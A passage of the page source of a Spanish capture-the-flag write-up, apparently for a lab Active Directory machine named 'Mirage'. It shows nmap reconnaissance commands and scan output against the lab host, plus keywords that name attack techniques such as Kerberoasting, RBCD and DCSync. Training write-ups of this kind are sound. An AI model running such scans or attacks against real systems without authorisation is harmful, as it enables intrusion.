+SF:x20&#39;Authorization\x20Violation&#39;\r\n&#34;)%r(HTTPOptions,1D3,&#34;INFO\x20{\&#34;ser
+SF:ver_id\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\&#34;,\
+SF:&#34;server_name\&#34;:\&#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI2
+SF:6M\&#34;,\&#34;version\&#34;:\&#34;2\.11\.3\&#34;,\&#34;proto\&#34;:1,\&#34;git_commit\&#34;:\&#34;a82cfda\&#34;,\&#34;
+SF:go\&#34;:\&#34;go1\.24\.2\&#34;,\&#34;host\&#34;:\&#34;0\.0\.0\.0\&#34;,\&#34;port\&#34;:4222,\&#34;headers\&#34;:t
+SF:rue,\&#34;auth_required\&#34;:true,\&#34;max_payload\&#34;:1048576,\&#34;jetstream\&#34;:true,\
+SF:&#34;client_id\&#34;:2716,\&#34;client_ip\&#34;:\&#34;10\.10\.15\.254\&#34;,\&#34;xkey\&#34;:\&#34;XC3AIA5L
+SF:H4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\&#34;}\x20\r\n-ERR\x20&#39;Aut
+SF:horization\x20Violation&#39;\r\n&#34;);
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-07-21T21:52:27
+|_  start_date: N/A
+|_clock-skew: 6h59m47s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 93.54 seconds
+NFS Misconfig
+Vemos que el dominio tiene el puerto 111 (NFS) abierto y como no tenemos nada más por donde tirar, vamos ver que contiene, y en el caso de que podamos y haya algún tipo de archivo, descargarnos-lo.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Mirage",
+      "item": "https://borhuub.github.io/writeups/mirage/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Mirage",
+  "name": "Mirage",
+  "description": "\nReconocimiento ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.78 -oG ports Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-21 16:49 +0200 Initiating SYN Stealth Scan at 16:49 Scanning 10.10.11.78 [65535 ports] Discovered open port 111/tcp on 10.10.11.78 Discovered open port 53/tcp on 10.10.11.78 Discovered open port 445/tcp on 10.10.11.78 Discovered open port 139/tcp on 10.10.11.78 Discovered open port 135/tcp on 10.10.11.78 Discovered open port 2049/tcp on 10.10.11.78 Discovered open port 51863/tcp on 10.10.11.78 Discovered open port 51920/tcp on 10.10.11.78 Discovered open port 47001/tcp on 10.10.11.78 Discovered open port 51885/tcp on 10.10.11.78 Discovered open port 49667/tcp on 10.10.11.78 Discovered open port 9389/tcp on 10.10.11.78 Discovered open port 51856/tcp on 10.10.11.78 Discovered open port 5985/tcp on 10.10.11.78 Discovered open port 51864/tcp on 10.10.11.78 Discovered open port 51879/tcp on 10.10.11.78 Discovered open port 49669/tcp on 10.10.11.78 Discovered open port 3269/tcp on 10.10.11.78 Discovered open port 49664/tcp on 10.10.11.78 Discovered open port 464/tcp on 10.10.11.78 Discovered open port 389/tcp on 10.10.11.78 Discovered open port 4222/tcp on 10.10.11.78 Discovered open port 593/tcp on 10.10.11.78 Discovered open port 49666/tcp on 10.10.11.78 Discovered open port 51913/tcp on 10.10.11.78 Discovered open port 51913/tcp on 10.10.11.78 Discovered open port 4222/tcp on 10.10.11.78 Discovered open port 389/tcp on 10.10.11.78 Discovered open port 464/tcp on 10.10.11.78 Discovered open port 49665/tcp on 10.10.11.78 Discovered open port 636/tcp on 10.10.11.78 Discovered open port 88/tcp on 10.10.11.78 Discovered open port 57944/tcp on 10.10.11.78 Discovered open port 3268/tcp on 10.10.11.78 Completed SYN Stealth Scan at 16:49, 15.62s elapsed (65535 total ports) Nmap scan report for 10.10.11.78 Host is up, received user-set (0.035s latency). Scanned at 2025-07-21 16:49:25 CEST for 16s Not shown: 65439 closed tcp ports (reset), 66 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 111/tcp open rpcbind syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 2049/tcp open nfs syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 4222/tcp open vrml-multi-use syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49669/tcp open unknown syn-ack ttl 127 51856/tcp open unknown syn-ack ttl 127 51863/tcp open unknown syn-ack ttl 127 51864/tcp open unknown syn-ack ttl 127 51879/tcp open unknown syn-ack ttl 127 51885/tcp open unknown syn-ack ttl 127 51913/tcp open unknown syn-ack ttl 127 51920/tcp open unknown syn-ack ttl 127 57944/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds Raw packets sent: 86448 (3.804MB) | Rcvd: 66503 (2.660MB) ❯ ports.py ports 🔍 Puertos encontrados: ➜ 53 ➜ 88 ➜ 111 ➜ 135 ➜ 139 ➜ 389 ➜ 445 ➜ 464 ➜ 593 ➜ 636 ➜ 2049 ➜ 3268 ➜ 3269 ➜ 4222 ➜ 5985 ➜ 9389 ➜ 47001 ➜ 49664 ➜ 49665 ➜ 49666 ➜ 49667 ➜ 49669 ➜ 51856 ➜ 51863 ➜ 51864 ➜ 51879 ➜ 51885 ➜ 51913 ➜ 51920 ➜ 57944 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001,49664,49665,49666,49667,49669,51856,51863,51864,51879,51885,51913,51920,57944 10.10.11.78 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-21 16:51 +0200 Nmap scan report for 10.10.11.78 Host is up (0.11s latency). PORT STATE SERVICE VERSION 53/tcp open domain (generic dns response: SERVFAIL) | fingerprint-strings: | DNS-SD-TCP: | _services | _dns-sd | _udp |_ local 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-21 21:51:31Z) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 2049/tcp open nlockmgr 1-4 (RPC #100021) 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 |_ssl-date: TLS randomness does not represent time 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 |_ssl-date: TLS randomness does not represent time 4222/tcp open vrml-multi-use? | fingerprint-strings: | GenericLines: | INFO {\u0026#34;server_id\u0026#34;:\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\u0026#34;,\u0026#34;server_name\u0026#34;:\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;2.11.3\u0026#34;,\u0026#34;proto\u0026#34;:1,\u0026#34;git_commit\u0026#34;:\u0026#34;a82cfda\u0026#34;,\u0026#34;go\u0026#34;:\u0026#34;go1.24.2\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;0.0.0.0\u0026#34;,\u0026#34;port\u0026#34;:4222,\u0026#34;headers\u0026#34;:true,\u0026#34;auth_required\u0026#34;:true,\u0026#34;max_payload\u0026#34;:1048576,\u0026#34;jetstream\u0026#34;:true,\u0026#34;client_id\u0026#34;:2714,\u0026#34;client_ip\u0026#34;:\u0026#34;10.10.15.254\u0026#34;,\u0026#34;xkey\u0026#34;:\u0026#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\u0026#34;} | -ERR \u0026#39;Authorization Violation\u0026#39; | GetRequest: | INFO {\u0026#34;server_id\u0026#34;:\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\u0026#34;,\u0026#34;server_name\u0026#34;:\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;2.11.3\u0026#34;,\u0026#34;proto\u0026#34;:1,\u0026#34;git_commit\u0026#34;:\u0026#34;a82cfda\u0026#34;,\u0026#34;go\u0026#34;:\u0026#34;go1.24.2\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;0.0.0.0\u0026#34;,\u0026#34;port\u0026#34;:4222,\u0026#34;headers\u0026#34;:true,\u0026#34;auth_required\u0026#34;:true,\u0026#34;max_payload\u0026#34;:1048576,\u0026#34;jetstream\u0026#34;:true,\u0026#34;client_id\u0026#34;:2715,\u0026#34;client_ip\u0026#34;:\u0026#34;10.10.15.254\u0026#34;,\u0026#34;xkey\u0026#34;:\u0026#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\u0026#34;} | -ERR \u0026#39;Authorization Violation\u0026#39; | HTTPOptions: | INFO {\u0026#34;server_id\u0026#34;:\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\u0026#34;,\u0026#34;server_name\u0026#34;:\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;2.11.3\u0026#34;,\u0026#34;proto\u0026#34;:1,\u0026#34;git_commit\u0026#34;:\u0026#34;a82cfda\u0026#34;,\u0026#34;go\u0026#34;:\u0026#34;go1.24.2\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;0.0.0.0\u0026#34;,\u0026#34;port\u0026#34;:4222,\u0026#34;headers\u0026#34;:true,\u0026#34;auth_required\u0026#34;:true,\u0026#34;max_payload\u0026#34;:1048576,\u0026#34;jetstream\u0026#34;:true,\u0026#34;client_id\u0026#34;:2716,\u0026#34;client_ip\u0026#34;:\u0026#34;10.10.15.254\u0026#34;,\u0026#34;xkey\u0026#34;:\u0026#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\u0026#34;} | -ERR \u0026#39;Authorization Violation\u0026#39; | NULL: | INFO {\u0026#34;server_id\u0026#34;:\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\u0026#34;,\u0026#34;server_name\u0026#34;:\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;2.11.3\u0026#34;,\u0026#34;proto\u0026#34;:1,\u0026#34;git_commit\u0026#34;:\u0026#34;a82cfda\u0026#34;,\u0026#34;go\u0026#34;:\u0026#34;go1.24.2\u0026#34;,\u0026#34;host\u0026#34;:\u0026#34;0.0.0.0\u0026#34;,\u0026#34;port\u0026#34;:4222,\u0026#34;headers\u0026#34;:true,\u0026#34;auth_required\u0026#34;:true,\u0026#34;max_payload\u0026#34;:1048576,\u0026#34;jetstream\u0026#34;:true,\u0026#34;client_id\u0026#34;:2713,\u0026#34;client_ip\u0026#34;:\u0026#34;10.10.15.254\u0026#34;,\u0026#34;xkey\u0026#34;:\u0026#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\u0026#34;} |_ -ERR \u0026#39;Authentication Timeout\u0026#39; 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 51856/tcp open msrpc Microsoft Windows RPC 51863/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 51864/tcp open msrpc Microsoft Windows RPC 51879/tcp open msrpc Microsoft Windows RPC 51885/tcp open msrpc Microsoft Windows RPC 51913/tcp open msrpc Microsoft Windows RPC 51920/tcp open msrpc Microsoft Windows RPC 57944/tcp open msrpc Microsoft Windows RPC 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port53-TCP:V=7.97%I=7%D=7/21%Time=687E540E%P=x86_64-pc-linux-gnu%r(DNS- SF:SD-TCP,30,\u0026#34;\\0\\.\\0\\0\\x80\\x82\\0\\x01\\0\\0\\0\\0\\0\\0\\t_services\\x07_dns-sd\\x04 SF:_udp\\x05local\\0\\0\\x0c\\0\\x01\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port4222-TCP:V=7.97%I=7%D=7/21%Time=687E53FB%P=x86_64-pc-linux-gnu%r(NU SF:LL,1D2,\u0026#34;INFO\\x20{\\\u0026#34;server_id\\\u0026#34;:\\\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X SF:2UA7GZ23H6BFSXI26M\\\u0026#34;,\\\u0026#34;server_name\\\u0026#34;:\\\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II5 SF:7L6M4X2UA7GZ23H6BFSXI26M\\\u0026#34;,\\\u0026#34;version\\\u0026#34;:\\\u0026#34;2\\.11\\.3\\\u0026#34;,\\\u0026#34;proto\\\u0026#34;:1,\\\u0026#34;git_c SF:ommit\\\u0026#34;:\\\u0026#34;a82cfda\\\u0026#34;,\\\u0026#34;go\\\u0026#34;:\\\u0026#34;go1\\.24\\.2\\\u0026#34;,\\\u0026#34;host\\\u0026#34;:\\\u0026#34;0\\.0\\.0\\.0\\\u0026#34;,\\\u0026#34;por SF:t\\\u0026#34;:4222,\\\u0026#34;headers\\\u0026#34;:true,\\\u0026#34;auth_required\\\u0026#34;:true,\\\u0026#34;max_payload\\\u0026#34;:104857 SF:6,\\\u0026#34;jetstream\\\u0026#34;:true,\\\u0026#34;client_id\\\u0026#34;:2713,\\\u0026#34;client_ip\\\u0026#34;:\\\u0026#34;10\\.10\\.15\\.254 SF:\\\u0026#34;,\\\u0026#34;xkey\\\u0026#34;:\\\u0026#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\\ SF:\u0026#34;}\\x20\\r\\n-ERR\\x20\u0026#39;Authentication\\x20Timeout\u0026#39;\\r\\n\u0026#34;)%r(GenericLines,1D3, SF:\u0026#34;INFO\\x20{\\\u0026#34;server_id\\\u0026#34;:\\\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ2 SF:3H6BFSXI26M\\\u0026#34;,\\\u0026#34;server_name\\\u0026#34;:\\\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2 SF:UA7GZ23H6BFSXI26M\\\u0026#34;,\\\u0026#34;version\\\u0026#34;:\\\u0026#34;2\\.11\\.3\\\u0026#34;,\\\u0026#34;proto\\\u0026#34;:1,\\\u0026#34;git_commit\\\u0026#34; SF::\\\u0026#34;a82cfda\\\u0026#34;,\\\u0026#34;go\\\u0026#34;:\\\u0026#34;go1\\.24\\.2\\\u0026#34;,\\\u0026#34;host\\\u0026#34;:\\\u0026#34;0\\.0\\.0\\.0\\\u0026#34;,\\\u0026#34;port\\\u0026#34;:422 SF:2,\\\u0026#34;headers\\\u0026#34;:true,\\\u0026#34;auth_required\\\u0026#34;:true,\\\u0026#34;max_payload\\\u0026#34;:1048576,\\\u0026#34;jet SF:stream\\\u0026#34;:true,\\\u0026#34;client_id\\\u0026#34;:2714,\\\u0026#34;client_ip\\\u0026#34;:\\\u0026#34;10\\.10\\.15\\.254\\\u0026#34;,\\\u0026#34;xk SF:ey\\\u0026#34;:\\\u0026#34;XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\\\u0026#34;}\\x20\\ SF:r\\n-ERR\\x20\u0026#39;Authorization\\x20Violation\u0026#39;\\r\\n\u0026#34;)%r(GetRequest,1D3,\u0026#34;INFO\\x2 SF:0{\\\u0026#34;server_id\\\u0026#34;:\\\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI SF:26M\\\u0026#34;,\\\u0026#34;server_name\\\u0026#34;:\\\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H SF:6BFSXI26M\\\u0026#34;,\\\u0026#34;version\\\u0026#34;:\\\u0026#34;2\\.11\\.3\\\u0026#34;,\\\u0026#34;proto\\\u0026#34;:1,\\\u0026#34;git_commit\\\u0026#34;:\\\u0026#34;a82cf SF:da\\\u0026#34;,\\\u0026#34;go\\\u0026#34;:\\\u0026#34;go1\\.24\\.2\\\u0026#34;,\\\u0026#34;host\\\u0026#34;:\\\u0026#34;0\\.0\\.0\\.0\\\u0026#34;,\\\u0026#34;port\\\u0026#34;:4222,\\\u0026#34;head SF:ers\\\u0026#34;:true,\\\u0026#34;auth_required\\\u0026#34;:true,\\\u0026#34;max_payload\\\u0026#34;:1048576,\\\u0026#34;jetstream\\\u0026#34; SF::true,\\\u0026#34;client_id\\\u0026#34;:2715,\\\u0026#34;client_ip\\\u0026#34;:\\\u0026#34;10\\.10\\.15\\.254\\\u0026#34;,\\\u0026#34;xkey\\\u0026#34;:\\\u0026#34;X SF:C3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\\\u0026#34;}\\x20\\r\\n-ERR\\ SF:x20\u0026#39;Authorization\\x20Violation\u0026#39;\\r\\n\u0026#34;)%r(HTTPOptions,1D3,\u0026#34;INFO\\x20{\\\u0026#34;ser SF:ver_id\\\u0026#34;:\\\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\\\u0026#34;,\\ SF:\u0026#34;server_name\\\u0026#34;:\\\u0026#34;NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI2 SF:6M\\\u0026#34;,\\\u0026#34;version\\\u0026#34;:\\\u0026#34;2\\.11\\.3\\\u0026#34;,\\\u0026#34;proto\\\u0026#34;:1,\\\u0026#34;git_commit\\\u0026#34;:\\\u0026#34;a82cfda\\\u0026#34;,\\\u0026#34; SF:go\\\u0026#34;:\\\u0026#34;go1\\.24\\.2\\\u0026#34;,\\\u0026#34;host\\\u0026#34;:\\\u0026#34;0\\.0\\.0\\.0\\\u0026#34;,\\\u0026#34;port\\\u0026#34;:4222,\\\u0026#34;headers\\\u0026#34;:t SF:rue,\\\u0026#34;auth_required\\\u0026#34;:true,\\\u0026#34;max_payload\\\u0026#34;:1048576,\\\u0026#34;jetstream\\\u0026#34;:true,\\ SF:\u0026#34;client_id\\\u0026#34;:2716,\\\u0026#34;client_ip\\\u0026#34;:\\\u0026#34;10\\.10\\.15\\.254\\\u0026#34;,\\\u0026#34;xkey\\\u0026#34;:\\\u0026#34;XC3AIA5L SF:H4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\\\u0026#34;}\\x20\\r\\n-ERR\\x20\u0026#39;Aut SF:horization\\x20Violation\u0026#39;\\r\\n\u0026#34;); Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-07-21T21:52:27 |_ start_date: N/A |_clock-skew: 6h59m47s | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.54 seconds NFS Misconfig Vemos que el dominio tiene el puerto 111 (NFS) abierto y como no tenemos nada más por donde tirar, vamos ver que contiene, y en el caso de que podamos y haya algún tipo de archivo, descargarnos-lo.\n",
+  "keywords": [
+    "Hard", "ActiveDirectory", "NFS", "DNS-Update", "Kerberoasting", "winPEAS", "ForceChangePassword", "AccountDisable", "LogonHours", "ReadGMSAPassword", "ESC10", "RBCD", "DCSync-Attack"
+  ],
+  "articleBody": "\nReconocimiento ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.78 -oG ports Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-21 16:49 +0200 Initiating SYN Stealth Scan at 16:49 Scanning 10.10.11.78 [65535 ports] Discovered open port 111/tcp on 10.10.11.78 Discovered open port 53/tcp on 10.10.11.78 Discovered open port 445/tcp on 10.10.11.78 Discovered open port 139/tcp on 10.10.11.78 Discovered open port 135/tcp on 10.10.11.78 Discovered open port 2049/tcp on 10.10.11.78 Discovered open port 51863/tcp on 10.10.11.78 Discovered open port 51920/tcp on 10.10.11.78 Discovered open port 47001/tcp on 10.10.11.78 Discovered open port 51885/tcp on 10.10.11.78 Discovered open port 49667/tcp on 10.10.11.78 Discovered open port 9389/tcp on 10.10.11.78 Discovered open port 51856/tcp on 10.10.11.78 Discovered open port 5985/tcp on 10.10.11.78 Discovered open port 51864/tcp on 10.10.11.78 Discovered open port 51879/tcp on 10.10.11.78 Discovered open port 49669/tcp on 10.10.11.78 Discovered open port 3269/tcp on 10.10.11.78 Discovered open port 49664/tcp on 10.10.11.78 Discovered open port 464/tcp on 10.10.11.78 Discovered open port 389/tcp on 10.10.11.78 Discovered open port 4222/tcp on 10.10.11.78 Discovered open port 593/tcp on 10.10.11.78 Discovered open port 49666/tcp on 10.10.11.78 Discovered open port 51913/tcp on 10.10.11.78 Discovered open port 51913/tcp on 10.10.11.78 Discovered open port 4222/tcp on 10.10.11.78 Discovered open port 389/tcp on 10.10.11.78 Discovered open port 464/tcp on 10.10.11.78 Discovered open port 49665/tcp on 10.10.11.78 Discovered open port 636/tcp on 10.10.11.78 Discovered open port 88/tcp on 10.10.11.78 Discovered open port 57944/tcp on 10.10.11.78 Discovered open port 3268/tcp on 10.10.11.78 Completed SYN Stealth Scan at 16:49, 15.62s elapsed (65535 total ports) Nmap scan report for 10.10.11.78 Host is up, received user-set (0.035s latency). Scanned at 2025-07-21 16:49:25 CEST for 16s Not shown: 65439 closed tcp ports (reset), 66 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 111/tcp open rpcbind syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 2049/tcp open nfs syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 4222/tcp open vrml-multi-use syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49665/tcp open unknown syn-ack ttl 127 49666/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 49669/tcp open unknown syn-ack ttl 127 51856/tcp open unknown syn-ack ttl 127 51863/tcp open unknown syn-ack ttl 127 51864/tcp open unknown syn-ack ttl 127 51879/tcp open unknown syn-ack ttl 127 51885/tcp open unknown syn-ack ttl 127 51913/tcp open unknown syn-ack ttl 127 51920/tcp open unknown syn-ack ttl 127 57944/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds Raw packets sent: 86448 (3.804MB) | Rcvd: 66503 (2.660MB) ❯ ports.py ports 🔍 Puertos encontrados: ➜ 53 ➜ 88 ➜ 111 ➜ 135 ➜ 139 ➜ 389 ➜ 445 ➜ 464 ➜ 593 ➜ 636 ➜ 2049 ➜ 3268 ➜ 3269 ➜ 4222 ➜ 5985 ➜ 9389 ➜ 47001 ➜ 49664 ➜ 49665 ➜ 49666 ➜ 49667 ➜ 49669 ➜ 51856 ➜ 51863 ➜ 51864 ➜ 51879 ➜ 51885 ➜ 51913 ➜ 51920 ➜ 57944 ¡Puertos copiados en el portapapeles! ❯ sudo nmap -sCV -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,4222,5985,9389,47001,49664,49665,49666,49667,49669,51856,51863,51864,51879,51885,51913,51920,57944 10.10.11.78 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-21 16:51 +0200 Nmap scan report for 10.10.11.78 Host is up (0.11s latency). PORT STATE SERVICE VERSION 53/tcp open domain (generic dns response: SERVFAIL) | fingerprint-strings: | DNS-SD-TCP: | _services | _dns-sd | _udp |_ local 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-21 21:51:31Z) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 